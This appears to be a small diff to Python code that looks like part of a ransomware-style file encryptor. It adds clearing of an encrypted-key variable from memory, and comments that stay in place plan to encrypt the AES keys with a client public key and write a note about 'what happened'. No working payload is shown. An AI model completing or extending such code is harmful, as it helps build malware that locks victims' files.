@@ -164,7 +164,10 @@ def menu():
             line = _[0] + " " + _[1] + "\n"
             f.write(line)
 
-    # gc.collect()
+    enc_aes_key_and_base64_path = None
+    gc.collect()
+    del enc_aes_key_and_base64_path
+    
     # # TODO
     # # encrypt all the AES keys with Client public key 
     # # create file with description of what happened
